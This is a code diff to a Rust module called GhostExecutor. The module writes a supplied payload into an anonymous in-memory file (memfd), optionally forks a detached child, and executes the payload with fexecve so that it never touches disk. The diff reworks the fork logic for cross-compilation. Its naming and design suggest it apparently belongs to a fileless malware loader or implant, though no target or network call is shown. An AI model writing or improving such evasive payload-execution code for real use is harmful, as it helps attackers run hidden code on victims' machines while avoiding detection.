@@ -6,7 +6,7 @@ use std::os::fd::AsRawFd;
 #[cfg(target_os = "linux")]
 use nix::{
     sys::memfd::{memfd_create, MemFdCreateFlag},
-    unistd::{write, fork, ForkResult},
+    unistd::write,
     libc,
 };
 
@@ -23,7 +23,7 @@ impl GhostExecutor {
         let raw_fd = memfd.as_raw_fd();
         let mut written = 0;
         while written < payload.len() {
-            let n = write(&memfd, &payload[written..])
+            let n = write(raw_fd, &payload[written..])
                 .map_err(|e| format!("write: {}", e))?;
             written += n;
         }
@@ -49,17 +49,20 @@ impl GhostExecutor {
         ];
 
         if fork_child {
-            match unsafe { fork() } {
-                Ok(ForkResult::Parent { child }) => {
-                    info!("[Ghost] child:{}", child);
-                    return Ok(());
-                }
-                Ok(ForkResult::Child) => {}
-                Err(e) => return Err(format!("fork: {}", e)),
+            // Use libc::fork directly to avoid nix cfg issues during cross-compile
+            let pid = unsafe { libc::fork() };
+            if pid < 0 {
+                return Err(format!("fork failed: {}", std::io::Error::last_os_error()));
+            } else if pid > 0 {
+                // Parent - child pid is in `pid`
+                info!("[Ghost] child:{}", pid);
+                return Ok(());
             }
+            // Child continues...
         }
 
         let ret = unsafe { libc::fexecve(raw_fd, c_args_ptr.as_ptr(), c_envs.as_ptr()) };
         Err(format!("fexecve: {} ({})", std::io::Error::last_os_error(), ret))
     }
 }
+
